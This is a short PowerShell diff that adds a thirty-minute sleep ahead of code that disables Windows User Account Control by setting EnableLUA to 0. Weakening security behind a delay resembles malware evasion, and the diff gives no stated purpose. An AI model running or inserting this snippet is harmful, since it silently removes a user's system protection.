@@ -1,3 +1,4 @@
+Start-Sleep -Seconds 1800
 $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 $uacProperty = "EnableLUA"
 Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0
